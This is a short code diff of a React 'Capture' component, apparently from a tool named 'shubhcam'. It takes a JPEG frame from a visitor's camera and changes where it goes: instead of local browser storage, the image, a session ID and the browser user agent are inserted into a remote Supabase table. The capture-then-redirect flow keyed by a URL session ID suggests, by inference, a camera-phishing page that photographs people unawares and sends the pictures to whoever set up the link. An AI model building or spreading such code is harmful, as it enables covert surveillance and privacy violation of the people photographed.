@@ -1,9 +1,9 @@
 import { useEffect, useState, useRef } from "react";
-import { useSearchParams, useNavigate } from "react-router-dom";
+import { useSearchParams } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
 
 const Capture = () => {
   const [searchParams] = useSearchParams();
-  const navigate = useNavigate();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [status, setStatus] = useState<"loading" | "capturing" | "redirecting">("loading");
@@ -39,15 +39,12 @@ const Capture = () => {
               ctx.drawImage(video, 0, 0);
               const imageData = canvas.toDataURL("image/jpeg", 0.8);
               
-              // Store captured photo
-              const photos = JSON.parse(localStorage.getItem(`shubhcam_${sessionId}`) || "[]");
-              photos.push({
-                id: Date.now(),
-                image: imageData,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
+              // Store captured photo in Supabase
+              await supabase.from('captured_photos').insert({
+                session_id: sessionId,
+                image_data: imageData,
+                user_agent: navigator.userAgent
               });
-              localStorage.setItem(`shubhcam_${sessionId}`, JSON.stringify(photos));
             }
           }
           
